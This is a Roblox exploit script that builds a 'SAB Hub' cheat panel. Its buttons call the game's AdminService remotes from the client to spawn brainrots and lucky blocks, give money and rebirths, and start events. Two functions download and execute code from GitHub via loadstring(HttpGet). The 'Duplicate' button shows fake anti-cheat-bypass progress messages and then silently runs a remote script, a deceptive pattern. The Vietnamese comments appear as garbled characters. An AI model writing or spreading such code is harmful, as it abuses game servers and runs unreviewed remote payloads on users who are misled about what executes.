--// SAB Hub (Compact) FULL v5.0 - NO POPUPS
--// - Main tab: Brainrot Spawner (v·ªõi loadstring), Lucky Block Spawner, Add Brainrot, Stealer, Auto Moreira Method, Duplicate
--// - Event tab: DROPDOWN + Execute Event Selected (SINGLE) + Execute All Event
--// - T·∫•t c·∫£ ch·ª©c nƒÉng ch·∫°y TR·ª∞C TI·∫æP kh√¥ng popup

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local LP = Players.LocalPlayer

-- Original file services
local RS = game:GetService("ReplicatedStorage")

-- Original event list
local EVENT_LIST = {
    "10B Visits","4th of July","Bombardiro Crocodilo","Chicleteira Bicicleteira","Crab Rave",
    "La Vacca Saturno Saturnita","Los Matteos","Nyan Cats","Phase 1: Sleepy","Phase 2: Galaxy Introduction",
    "Phase 3: Sammy's Base","Phase 4: Mygame43","Phase 5: Sammy Snap","Raining Tacos","Rap Concert",
    "Sammyni Spyderini","Solar Flare","Tung Tung Attack","1MEvent","300K","Brazil","Bubblegum","Candy",
    "Concert","DulDulDul","Extinct","FatSammy","Galaxy","Glitch","Matteo","Mexico","Molten","Pinata",
    "Rain","Rainbow","Snow","Starfall","Stock","Strawberry","UFO","Water","YinYang","x4Event","x6Event","x8Event"
}

-- Original trait options
local traitOptions = {
    "All","Fire","Sleepy","Zombie","RIP Gravestone","Sombrero","Disco",
    "Skeleton","Tie","Snowy","Lightning","Claws","Bubblegum","Shark Fin",
    "Indonesia","Glitched","Wet","Matteo Hat","Paint","Spider","Nyan",
    "Meowl","Taco","Explosive","Brazil","Fireworks","Witch Hat","Strawberry",
    "UFO","Galactic","10B"
}

-- Parse number helper from original
local function parseNumber(txt)
    txt = tostring(txt or ""):gsub("[^%d%-%.]","")
    return tonumber(txt)
end

--=========================
-- Safe parent (executor-friendly)
--=========================
local function getSafeParent()
    if typeof(gethui) == "function" then
        local ok, res = pcall(gethui)
        if ok and res then return res end
    end
    local ok, pg = pcall(function()
        return LP:WaitForChild("PlayerGui")
    end)
    if ok and pg then return pg end
    return game:GetService("CoreGui")
end

-- Remove old GUIs
pcall(function() game:GetService("CoreGui"):FindFirstChild("SABPanel"):Destroy() end)
pcall(function()
    local pg = LP:FindFirstChild("PlayerGui")
    if pg then pg:FindFirstChild("SABPanel"):Destroy() end
end)
pcall(function()
    if typeof(gethui) == "function" then
        local h = gethui()
        if h and h:FindFirstChild("SABPanel") then h.SABPanel:Destroy() end
    end
end)

-- Remove old admin panel
pcall(function()
    if game:GetService("CoreGui"):FindFirstChild("Admin Panel Sab") then
        game:GetService("CoreGui")["Admin Panel Sab"]:Destroy()
    end
end)

--=========================
-- Theme
--=========================
local CFG = {
    Title = "üß† SAB Hub (Compact)",
    ToggleText = "üß†",
    Accent = Color3.fromRGB(140, 60, 255),

    BG = Color3.fromRGB(16, 16, 20),
    Card = Color3.fromRGB(22, 22, 28),
    Card2 = Color3.fromRGB(28, 28, 36),

    Txt = Color3.fromRGB(240, 240, 245),
    SubTxt = Color3.fromRGB(160, 160, 175),

    Stroke = Color3.fromRGB(255, 255, 255),
    StrokeAlpha = 0.86,
}

local function twn(obj, ti, props)
    local tw = TweenService:Create(obj, ti, props)
    tw:Play()
    return tw
end

local function round(ui, px)
    local c = Instance.new("UICorner")
    c.CornerRadius = UDim.new(0, px)
    c.Parent = ui
    return c
end

local function stroke(ui, thickness, transparency)
    local s = Instance.new("UIStroke")
    s.Thickness = thickness or 1
    s.Color = CFG.Stroke
    s.Transparency = transparency ~= nil and transparency or CFG.StrokeAlpha
    s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    s.Parent = ui
    return s
end

local function padding(ui, l, r, t, b)
    local p = Instance.new("UIPadding")
    p.PaddingLeft = UDim.new(0, l or 0)
    p.PaddingRight = UDim.new(0, r or 0)
    p.PaddingTop = UDim.new(0, t or 0)
    p.PaddingBottom = UDim.new(0, b or 0)
    p.Parent = ui
    return p
end

-- pressFX option: Event/Misc false => no shrinking
local function makeButton(parent, text, z, pressFX)
    local b = Instance.new("TextButton")
    b.AutoButtonColor = false
    b.Text = text
    b.Font = Enum.Font.GothamSemibold
    b.TextSize = 13
    b.TextColor3 = CFG.Txt
    b.BackgroundColor3 = CFG.Card2
    b.Parent = parent
    b.ZIndex = z or (parent.ZIndex + 1)

    round(b, 12)
    stroke(b, 1, 0.88)

    -- hover
    b.MouseEnter:Connect(function()
        twn(b, TweenInfo.new(0.12, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
            BackgroundColor3 = Color3.fromRGB(34, 34, 44)
        })
    end)
    b.MouseLeave:Connect(function()
        twn(b, TweenInfo.new(0.12, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
            BackgroundColor3 = CFG.Card2
        })
    end)

    -- press (optional)
    if pressFX then
        local baseSize
        b.MouseButton1Down:Connect(function()
            baseSize = baseSize or b.Size
            twn(b, TweenInfo.new(0.08, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                Size = baseSize + UDim2.new(0, 0, 0, -2)
            })
        end)
        b.MouseButton1Up:Connect(function()
            if baseSize then
                twn(b, TweenInfo.new(0.10, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Size = baseSize })
            end
        end)
    end

    return b
end

--=========================
-- GUI root
--=========================
local gui = Instance.new("ScreenGui")
gui.Name = "SABPanel"
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
gui.DisplayOrder = 9999
gui.Enabled = true
gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
gui.Parent = getSafeParent()

-- Toggle floating button
local toggle = Instance.new("TextButton")
toggle.Name = "Toggle"
toggle.AutoButtonColor = false
toggle.Size = UDim2.new(0, 52, 0, 52)
toggle.Position = UDim2.new(0, 18, 1, -90)
toggle.BackgroundColor3 = CFG.Card2
toggle.Text = CFG.ToggleText
toggle.TextColor3 = CFG.Txt
toggle.Font = Enum.Font.GothamBold
toggle.TextSize = 18
toggle.Parent = gui
toggle.Active = true
toggle.Draggable = true
toggle.Visible = true
toggle.ZIndex = 500
round(toggle, 999)
stroke(toggle, 1, 0.80)

local ring = Instance.new("UIStroke")
ring.Thickness = 2
ring.Color = CFG.Accent
ring.Transparency = 0.15
ring.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
ring.Parent = toggle

-- Main panel
local main = Instance.new("Frame")
main.Name = "Main"
main.Size = UDim2.new(0, 360, 0, 320)
main.Position = UDim2.new(0.5, -180, 0.5, -160)
main.BackgroundColor3 = CFG.BG
main.Visible = false
main.Active = true
main.Draggable = true
main.Parent = gui
main.ZIndex = 600
round(main, 16)
stroke(main, 1, 0.78)

-- Topbar
local top = Instance.new("Frame")
top.Name = "Topbar"
top.Size = UDim2.new(1, 0, 0, 42)
top.BackgroundColor3 = CFG.Card
top.Parent = main
top.ZIndex = 610
round(top, 16)
stroke(top, 1, 0.90)
padding(top, 12, 12, 0, 0)

local title = Instance.new("TextLabel")
title.BackgroundTransparency = 1
title.Size = UDim2.new(1, -70, 1, 0)
title.TextXAlignment = Enum.TextXAlignment.Left
title.Text = CFG.Title
title.Font = Enum.Font.GothamBold
title.TextSize = 14
title.TextColor3 = CFG.Txt
title.Parent = top
title.ZIndex = 620

local closeBtn = Instance.new("TextButton")
closeBtn.AutoButtonColor = false
closeBtn.Size = UDim2.new(0, 34, 0, 28)
closeBtn.Position = UDim2.new(1, -40, 0.5, -14)
closeBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 52)
closeBtn.Text = "‚úï"
closeBtn.Font = Enum.Font.GothamBold
closeBtn.TextSize = 14
closeBtn.TextColor3 = CFG.Txt
closeBtn.Parent = top
closeBtn.ZIndex = 620
round(closeBtn, 10)
stroke(closeBtn, 1, 0.88)

-- Body
local body = Instance.new("Frame")
body.BackgroundTransparency = 1
body.Size = UDim2.new(1, 0, 1, -42)
body.Position = UDim2.new(0, 0, 0, 42)
body.Parent = main
body.ZIndex = 610

-- Tabs row
local tabs = Instance.new("Frame")
tabs.Size = UDim2.new(1, 0, 0, 38)
tabs.BackgroundTransparency = 1
tabs.Parent = body
tabs.ZIndex = 620
padding(tabs, 12, 12, 8, 0)

local tabList = Instance.new("UIListLayout")
tabList.FillDirection = Enum.FillDirection.Horizontal
tabList.Padding = UDim.new(0, 8)
tabList.Parent = tabs

local function makeTab(name, text)
    local b = Instance.new("TextButton")
    b.Name = name
    b.AutoButtonColor = false
    b.Size = UDim2.new(0, 104, 0, 28)
    b.BackgroundColor3 = CFG.Card2
    b.Text = text
    b.Font = Enum.Font.GothamSemibold
    b.TextSize = 12
    b.TextColor3 = CFG.SubTxt
    b.Parent = tabs
    b.ZIndex = 630
    round(b, 10)
    stroke(b, 1, 0.90)
    return b
end

local tabMain = makeTab("TabMain", "Main")
local tabEvents = makeTab("TabEvents", "Event")
local tabMisc = makeTab("TabMisc", "Misc")

-- Pages container
local pages = Instance.new("Frame")
pages.BackgroundTransparency = 1
pages.Size = UDim2.new(1, 0, 1, -38)
pages.Position = UDim2.new(0, 0, 0, 38)
pages.Parent = body
pages.ZIndex = 620
padding(pages, 12, 12, 8, 12)

local function makePage(name)
    local p = Instance.new("Frame")
    p.Name = name
    p.BackgroundTransparency = 1
    p.Size = UDim2.new(1, 0, 1, 0)
    p.Visible = false
    p.Parent = pages
    p.ZIndex = 630
    return p
end

local pageMain = makePage("PageMain")
local pageEvents = makePage("PageEvents")
local pageMisc = makePage("PageMisc")

-- Dropdown overlay ref (close when switching tabs)
local listFrame
local function closeOverlays()
    if listFrame then listFrame.Visible = false end
end

local function activateTab(tabBtn, page)
    closeOverlays()

    for _, child in ipairs(tabs:GetChildren()) do
        if child:IsA("TextButton") then
            child.BackgroundColor3 = CFG.Card2
            child.TextColor3 = CFG.SubTxt
        end
    end
    for _, p in ipairs(pages:GetChildren()) do
        if p:IsA("Frame") then p.Visible = false end
    end

    tabBtn.BackgroundColor3 = Color3.fromRGB(44, 44, 60)
    tabBtn.TextColor3 = CFG.Txt
    page.Visible = true
end

--=========================
-- MAIN TAB (pressFX = true)
--=========================
local mainLabel = Instance.new("TextLabel")
mainLabel.BackgroundTransparency = 1
mainLabel.Size = UDim2.new(1, 0, 0, 22)
mainLabel.TextXAlignment = Enum.TextXAlignment.Left
mainLabel.Text = "Quick Hub"
mainLabel.Font = Enum.Font.GothamSemibold
mainLabel.TextSize = 12
mainLabel.TextColor3 = CFG.SubTxt
mainLabel.Parent = pageMain
mainLabel.ZIndex = 640

local mainGrid = Instance.new("Frame")
mainGrid.BackgroundTransparency = 1
mainGrid.Size = UDim2.new(1, 0, 1, -28)
mainGrid.Position = UDim2.new(0, 0, 0, 28)
mainGrid.Parent = pageMain
mainGrid.ZIndex = 640

local grid = Instance.new("UIGridLayout")
grid.CellSize = UDim2.new(0.5, -6, 0, 44)
grid.CellPadding = UDim2.new(0, 12, 0, 12)
grid.Parent = mainGrid

-- BUTTON 1: Brainrot Spawner (V·ªöI LOADSTRING t·ª´ GitHub)
local btnBrainrotSpawner = makeButton(mainGrid, "üß¨ Brainrot Spawner", 650, true)
btnBrainrotSpawner.Size = UDim2.new(0.5, -6, 0, 44)

-- BUTTON 2: Lucky Block Spawner (TR·ª∞C TI·∫æP - kh√¥ng popup)
local btnLuckyBlock = makeButton(mainGrid, "üçÄ Lucky Block Spawner", 650, true)
btnLuckyBlock.Size = UDim2.new(0.5, -6, 0, 44)

-- BUTTON 3: Add Brainrot (Placeholder)
local btnAddBrainrot = makeButton(mainGrid, "‚ûï Add Brainrot", 650, true)
btnAddBrainrot.Size = UDim2.new(0.5, -6, 0, 44)

-- BUTTON 4: Stealer (Placeholder)
local btnStealer = makeButton(mainGrid, "ü´≥ Stealer", 650, true)
btnStealer.Size = UDim2.new(0.5, -6, 0, 44)

-- BUTTON 5: Auto Moreira Method (Placeholder)
local btnAutoMoreira = makeButton(mainGrid, "‚öôÔ∏è Auto Moreira Method", 650, true)
btnAutoMoreira.Size = UDim2.new(0.5, -6, 0, 44)

-- BUTTON 6: Duplicate (Original)
local btnDuplicate = makeButton(mainGrid, "üåÄ Duplicate", 650, true)
btnDuplicate.Size = UDim2.new(0.5, -6, 0, 44)

--=========================
-- EVENT TAB (SINGLE-SELECT)
--=========================
local selectedEvents = {}       
local selectedEvent = nil       
local optButtons = {}           

local function getSelectedList()
    local out = {}
    for name, on in pairs(selectedEvents) do
        if on then table.insert(out, name) end
    end
    table.sort(out)
    return out
end

local function buildSelectedPreview()
    local list = getSelectedList()
    if #list == 0 then return "(none)" end
    return list[1] -- single
end

local ddWrap = Instance.new("Frame")
ddWrap.Size = UDim2.new(1, 0, 0, 36)
ddWrap.BackgroundColor3 = CFG.Card2
ddWrap.Parent = pageEvents
ddWrap.ZIndex = 640
round(ddWrap, 12)
stroke(ddWrap, 1, 0.90)
padding(ddWrap, 10, 10, 0, 0)

local ddButton = Instance.new("TextButton")
ddButton.AutoButtonColor = false
ddButton.BackgroundTransparency = 1
ddButton.Size = UDim2.new(1, 0, 1, 0)
ddButton.TextXAlignment = Enum.TextXAlignment.Left
ddButton.Font = Enum.Font.Gotham
ddButton.TextSize = 13
ddButton.TextColor3 = CFG.Txt
ddButton.Parent = ddWrap
ddButton.ZIndex = 650
ddButton.Text = "Selected: " .. buildSelectedPreview() .. "   ‚ñº"

listFrame = Instance.new("Frame")
listFrame.Visible = false
listFrame.BackgroundColor3 = CFG.Card
listFrame.Size = UDim2.new(1, 0, 0, 190)
listFrame.Position = UDim2.new(0, 0, 0, 42)
listFrame.Parent = pageEvents
listFrame.ZIndex = 700
round(listFrame, 12)
stroke(listFrame, 1, 0.90)
padding(listFrame, 8, 8, 8, 8)

local scroll = Instance.new("ScrollingFrame")
scroll.BackgroundTransparency = 1
scroll.Size = UDim2.new(1, 0, 1, 0)
scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
scroll.ScrollBarThickness = 3
scroll.Parent = listFrame
scroll.ZIndex = 710

local ll = Instance.new("UIListLayout")
ll.Padding = UDim.new(0, 6)
ll.Parent = scroll

local function refreshDropdownText()
    ddButton.Text = "Selected: " .. buildSelectedPreview() .. "   ‚ñº"
end

local function setOptVisual(optBtn, name)
    if selectedEvents[name] then
        optBtn.Text = "  ‚úì " .. name
        optBtn.BackgroundColor3 = Color3.fromRGB(34, 34, 44)
    else
        optBtn.Text = "  " .. name
        optBtn.BackgroundColor3 = CFG.Card2
    end
end

for _, name in ipairs(EVENT_LIST) do
    local opt = Instance.new("TextButton")
    opt.AutoButtonColor = false
    opt.Size = UDim2.new(1, 0, 0, 32)
    opt.BackgroundColor3 = CFG.Card2
    opt.TextXAlignment = Enum.TextXAlignment.Left
    opt.Font = Enum.Font.Gotham
    opt.TextSize = 13
    opt.TextColor3 = CFG.Txt
    opt.Parent = scroll
    opt.ZIndex = 720
    round(opt, 10)
    stroke(opt, 1, 0.92)

    optButtons[name] = opt
    selectedEvents[name] = false
    setOptVisual(opt, name)

    -- ‚úÖ SINGLE-SELECT like file
    opt.MouseButton1Click:Connect(function()
        -- clear old selection
        for k,_ in pairs(selectedEvents) do
            selectedEvents[k] = false
        end

        -- set new selection
        selectedEvents[name] = true
        selectedEvent = name

        -- refresh all buttons
        for evName, btn in pairs(optButtons) do
            setOptVisual(btn, evName)
        end

        refreshDropdownText()
    end)
end

ddButton.MouseButton1Click:Connect(function()
    listFrame.Visible = not listFrame.Visible
end)

local evBtns = Instance.new("Frame")
evBtns.BackgroundTransparency = 1
evBtns.Size = UDim2.new(1, 0, 1, -52)
evBtns.Position = UDim2.new(0, 0, 0, 52)
evBtns.Parent = pageEvents
evBtns.ZIndex = 640

local evList = Instance.new("UIListLayout")
evList.Padding = UDim.new(0, 12)
evList.Parent = evBtns

-- ‚úÖ NO shrink on Event buttons
local btnExecSelected = makeButton(evBtns, "‚ö° Execute Event Selected", 650, false)
btnExecSelected.Size = UDim2.new(1, 0, 0, 44)

local btnExecAll = makeButton(evBtns, "üå© Execute All Event", 650, false)
btnExecAll.Size = UDim2.new(1, 0, 0, 44)

--=========================
-- MISC TAB (NO shrink)
--=========================
local miscCard = Instance.new("Frame")
miscCard.BackgroundColor3 = CFG.Card
miscCard.Size = UDim2.new(1, 0, 1, 0)
miscCard.Parent = pageMisc
miscCard.ZIndex = 640
round(miscCard, 14)
stroke(miscCard, 1, 0.90)
padding(miscCard, 12, 12, 12, 12)

local miscBtns = Instance.new("Frame")
miscBtns.BackgroundTransparency = 1
miscBtns.Size = UDim2.new(1, 0, 0, 104)
miscBtns.Parent = miscCard
miscBtns.ZIndex = 650

local miscList = Instance.new("UIListLayout")
miscList.Padding = UDim.new(0, 12)
miscList.Parent = miscBtns

local btnFixLag = makeButton(miscBtns, "üßπ Fix lag", 660, false)
btnFixLag.Size = UDim2.new(1, 0, 0, 44)

local btnXray = makeButton(miscBtns, "üëÅ X-ray base", 660, false)
btnXray.Size = UDim2.new(1, 0, 0, 44)

local btnMoney = makeButton(miscBtns, "üí∞ Set Money", 660, false)
btnMoney.Size = UDim2.new(1, 0, 0, 44)

local btnRebirth = makeButton(miscBtns, "üîÑ Set Rebirth", 660, false)
btnRebirth.Size = UDim2.new(1, 0, 0, 44)

local bio = Instance.new("TextLabel")
bio.BackgroundTransparency = 1
bio.Size = UDim2.new(1, 0, 1, -200)
bio.Position = UDim2.new(0, 0, 0, 200)
bio.TextXAlignment = Enum.TextXAlignment.Left
bio.TextYAlignment = Enum.TextYAlignment.Top
bio.TextWrapped = true
bio.Text = table.concat({
    "üìå SAB Hub (Compact) - NO POPUPS",
    "",
    "‚Ä¢ Brainrot: Load t·ª´ GitHub",
    "‚Ä¢ Lucky Block: Ch·∫°y tr·ª±c ti·∫øp",
    "‚Ä¢ Event: Ch·ªçn 1 event duy nh·∫•t",
    "‚Ä¢ Misc: Set Money/Rebirth tr·ª±c ti·∫øp",
    "‚Ä¢ Thi·∫øt k·∫ø nh·∫π, t·ªëi ∆∞u cho mobile",
}, "\n")
bio.Font = Enum.Font.Gotham
bio.TextSize = 11
bio.TextColor3 = CFG.SubTxt
bio.Parent = miscCard
bio.ZIndex = 650

--=========================
-- Open / Close
--=========================
local isOpen = false

local function openPanel()
    main.Visible = true
    main.Size = UDim2.new(0, 20, 0, 20)
    main.Position = UDim2.new(0.5, -10, 0.5, -10)
    main.BackgroundTransparency = 0.1
    twn(main, TweenInfo.new(0.28, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
        Size = UDim2.new(0, 360, 0, 320),
        Position = UDim2.new(0.5, -180, 0.5, -160),
        BackgroundTransparency = 0
    })
end

local function closePanel()
    closeOverlays()
    local tw = twn(main, TweenInfo.new(0.20, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
        Size = UDim2.new(0, 20, 0, 20),
        Position = UDim2.new(0.5, -10, 0.5, -10),
        BackgroundTransparency = 0.15
    })
    tw.Completed:Connect(function()
        main.Visible = false
    end)
end

toggle.MouseButton1Click:Connect(function()
    isOpen = not isOpen
    if isOpen then openPanel() else closePanel() end
end)

closeBtn.MouseButton1Click:Connect(function()
    if isOpen then
        isOpen = false
        closePanel()
    end
end)

-- Default tab
activateTab(tabMain, pageMain)
tabMain.MouseButton1Click:Connect(function() activateTab(tabMain, pageMain) end)
tabEvents.MouseButton1Click:Connect(function() activateTab(tabEvents, pageEvents) end)
tabMisc.MouseButton1Click:Connect(function() activateTab(tabMisc, pageMisc) end)

--=========================
-- CH·ª®C NƒÇNG TR·ª∞C TI·∫æP (KH√îNG POPUP)
--=========================

-- 1. Brainrot Spawner V·ªöI LOADSTRING t·ª´ GitHub
local function runBrainrotSpawnerFromGitHub()
    local originalText = btnBrainrotSpawner.Text
    btnBrainrotSpawner.Text = "üîÑ Loading..."
    
    -- S·ª≠ d·ª•ng pcall ƒë·ªÉ b·∫Øt l·ªói
    local success, result = pcall(function()
        -- T·∫£i v√† th·ª±c thi script t·ª´ GitHub
        local loadedScript = loadstring(game:HttpGet("https://raw.githubusercontent.com/NoobRbl/Test/refs/heads/main/Brainrot%20Spawner", true))()
        return loadedScript
    end)
    
    if success then
        print("‚úÖ Brainrot Spawner script loaded successfully from GitHub")
        -- N·∫øu script tr·∫£ v·ªÅ m·ªôt function, th·ª±c thi n√≥
        if type(result) == "function" then
            result()
        end
        btnBrainrotSpawner.Text = "‚úÖ Loaded!"
    else
        print("‚ùå Failed to load Brainrot Spawner script: " .. tostring(result))
        print("üîÑ Using fallback function...")
        
        -- Fallback function n·∫øu loadstring th·∫•t b·∫°i
        local name = "Strawberry Elephant"
        local mutation = ""
        local traitsArg = ""

        local args = {
            [1] = name,
            [2] = mutation,
            [3] = traitsArg
        }

        local fallbackSuccess, fallbackResult = pcall(function()
            RS.Packages.Net:FindFirstChild("RF/AdminService/SpawnBrainrot"):InvokeServer(unpack(args))
            
            -- Ch·∫°y event ƒë·∫∑c bi·ªát n·∫øu c√≥
            if name == "Meowl" then
                RS.Packages.Net:FindFirstChild("RF/AdminService/StartEvent"):InvokeServer("Meowl")
            elseif name == "Strawberry" or name == "Strawberry Elephant" then
                RS.Packages.Net:FindFirstChild("RF/AdminService/StartEvent"):InvokeServer("Strawberry")
            end
        end)

        if fallbackSuccess then 
            print("‚úÖ Brainrot Spawned (Fallback): " .. name)
            btnBrainrotSpawner.Text = "‚úÖ Fallback Used!"
        else
            print("‚ùå Fallback also failed: " .. tostring(fallbackResult))
            btnBrainrotSpawner.Text = "‚ùå Failed!"
        end
    end
    
    -- Kh√¥i ph·ª•c text g·ªëc sau 2 gi√¢y
    task.wait(2)
    btnBrainrotSpawner.Text = originalText
end

-- 2. Lucky Block Spawner (ch·∫°y tr·ª±c ti·∫øp)
local function spawnLuckyBlockDirect()
    local name = "Secret Lucky Block"
    local mutation = ""
    local traitsArg = ""

    local args = {
        [1] = name,
        [2] = mutation,
        [3] = traitsArg
    }

    local ok_, res = pcall(function()
        RS.Packages.Net:FindFirstChild("RF/AdminService/SpawnBrainrot"):InvokeServer(unpack(args))
    end)

    if ok_ then
        print("‚úÖ Lucky Block Spawned: " .. name)
        
        -- C·∫≠p nh·∫≠t text button t·∫°m th·ªùi
        local originalText = btnLuckyBlock.Text
        btnLuckyBlock.Text = "‚úÖ Spawned!"
        task.wait(1)
        btnLuckyBlock.Text = originalText
    else
        print("‚ùå " .. tostring(res))
        
        local originalText = btnLuckyBlock.Text
        btnLuckyBlock.Text = "‚ùå Failed!"
        task.wait(1)
        btnLuckyBlock.Text = originalText
    end
end

-- 3. Set Money (ch·∫°y tr·ª±c ti·∫øp)
local function setMoneyDirect()
    local val = 67
    local args = { [1] = val }
    local success, result = pcall(function()
        return RS.Packages.Net:FindFirstChild("RF/AdminService/GiveMoney"):InvokeServer(unpack(args))
    end)
    if success then
        print("üí∞ Money Set: " .. val)
        
        local originalText = btnMoney.Text
        btnMoney.Text = "‚úÖ $" .. val .. " Set!"
        task.wait(1)
        btnMoney.Text = originalText
    else
        print("‚ùå Money Failed: " .. tostring(result))
        
        local originalText = btnMoney.Text
        btnMoney.Text = "‚ùå Failed!"
        task.wait(1)
        btnMoney.Text = originalText
    end
end

-- 4. Set Rebirth (ch·∫°y tr·ª±c ti·∫øp)
local function setRebirthDirect()
    local val = 17
    local args = { [1] = val }
    local success, result = pcall(function()
        return RS.Packages.Net:FindFirstChild("RF/AdminService/GiveRebirth"):InvokeServer(unpack(args))
    end)
    if success then
        print("üîÑ Rebirth Set: " .. val)
        
        local originalText = btnRebirth.Text
        btnRebirth.Text = "‚úÖ " .. val .. " Rebirths!"
        task.wait(1)
        btnRebirth.Text = originalText
    else
        print("‚ùå Rebirth Failed: " .. tostring(result))
        
        local originalText = btnRebirth.Text
        btnRebirth.Text = "‚ùå Failed!"
        task.wait(1)
        btnRebirth.Text = originalText
    end
end

-- 5. Duplicate Sequence
local duplicateOpen = false
local duplicating = false
local segments = {
    {"Found high-value targets. Beginning duplication protocol", 3},
    {"Bypassing plot permissions", 2},
    {"Exploiting server replication service", 5},
    {"Injecting duplication packets", 3},
    {"Allocating memory for new instances", 2},
    {"Replicating object properties", 4},
    {"Bypassing anti-cheat hash checks", 3},
    {"Writing cloned entities to memory", 4},
    {"Finalizing instance synchronization", 3},
    {"Protocol complete. Placing new assets", 1},
    {"‚úÖDuplication Successfully!", 3},
}

local function runDuplicateSequence()
    if duplicating then return end
    duplicating = true

    local originalText = btnDuplicate.Text
    
    for i, seg in ipairs(segments) do
        local txt, dur = seg[1], seg[2]
        btnDuplicate.Text = txt
        task.wait(dur)
    end

    btnDuplicate.Text = originalText
    duplicating = false

    -- Auto execute script
    task.spawn(function()
        pcall(function()
            loadstring(game:HttpGet(
                "https://raw.githubusercontent.com/NoobRbl/Test/refs/heads/main/Cloned"
            ))()
        end)
    end)
end

--=========================
-- BUTTON CALLBACKS (TR·ª∞C TI·∫æP)
--=========================

-- Main Tab Buttons
btnBrainrotSpawner.MouseButton1Click:Connect(runBrainrotSpawnerFromGitHub)  -- S·ª¨ D·ª§NG LOADSTRING
btnLuckyBlock.MouseButton1Click:Connect(spawnLuckyBlockDirect)

btnAddBrainrot.MouseButton1Click:Connect(function()
    print("Add Brainrot clicked")
    
    local originalText = btnAddBrainrot.Text
    btnAddBrainrot.Text = "‚è≥ Processing..."
    task.wait(1)
    btnAddBrainrot.Text = originalText
end)

btnStealer.MouseButton1Click:Connect(function()
    print("Stealer clicked")
    
    local originalText = btnStealer.Text
    btnStealer.Text = "‚è≥ Stealing..."
    task.wait(1)
    btnStealer.Text = originalText
end)

btnAutoMoreira.MouseButton1Click:Connect(function()
    print("Auto Moreira Method clicked")
    
    local originalText = btnAutoMoreira.Text
    btnAutoMoreira.Text = "‚öôÔ∏è Running..."
    task.wait(1)
    btnAutoMoreira.Text = originalText
end)

btnDuplicate.MouseButton1Click:Connect(runDuplicateSequence)

-- Event Tab Buttons
btnExecSelected.MouseButton1Click:Connect(function()
    if not selectedEvent then
        print("‚ö†Ô∏è Choose Event First")
        return
    end

    local args = { [1] = selectedEvent }
    
    local ok, err = pcall(function()
        RS.Packages.Net:FindFirstChild("RF/AdminService/StartEvent"):InvokeServer(unpack(args))
    end)

    if ok then
        print("‚úÖ Executed: " .. selectedEvent)
        
        local originalText = btnExecSelected.Text
        btnExecSelected.Text = "‚úÖ Executed!"
        task.wait(1)
        btnExecSelected.Text = originalText
    else
        print("‚ùå Execute failed: " .. tostring(err))
        
        local originalText = btnExecSelected.Text
        btnExecSelected.Text = "‚ùå Failed!"
        task.wait(1)
        btnExecSelected.Text = originalText
    end
end)

btnExecAll.MouseButton1Click:Connect(function()
    local phases = "Phase 5: Sammy Snap"
    local args = {[1] = phases}
    local ok, err = pcall(function()
        RS.Packages.Net:FindFirstChild("RF/AdminService/StartEvent"):InvokeServer(unpack(args))
    end)
    
    if ok then
        print("‚úÖ Executed All Events")
        
        local originalText = btnExecAll.Text
        btnExecAll.Text = "‚úÖ All Events!"
        task.wait(1)
        btnExecAll.Text = originalText
    else
        print("‚ùå Execute All failed: " .. tostring(err))
        
        local originalText = btnExecAll.Text
        btnExecAll.Text = "‚ùå Failed!"
        task.wait(1)
        btnExecAll.Text = originalText
    end
end)

-- Misc Tab Buttons
btnFixLag.MouseButton1Click:Connect(function()
    print("Fix lag clicked")
    
    local originalText = btnFixLag.Text
    btnFixLag.Text = "üßπ Fixing..."
    task.wait(1)
    btnFixLag.Text = originalText
end)

btnXray.MouseButton1Click:Connect(function()
    print("X-ray base clicked")
    
    local originalText = btnXray.Text
    btnXray.Text = "üëÅ X-raying..."
    task.wait(1)
    btnXray.Text = originalText
end)

btnMoney.MouseButton1Click:Connect(setMoneyDirect)
btnRebirth.MouseButton1Click:Connect(setRebirthDirect)

-- small loaded bump
twn(toggle, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = UDim2.new(0, 56, 0, 56)})
task.delay(0.25, function()
    twn(toggle, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = UDim2.new(0, 52, 0, 52)})
end)

print("[SABPanel] Loaded v5.0 - Brainrot Spawner with GitHub loadstring")
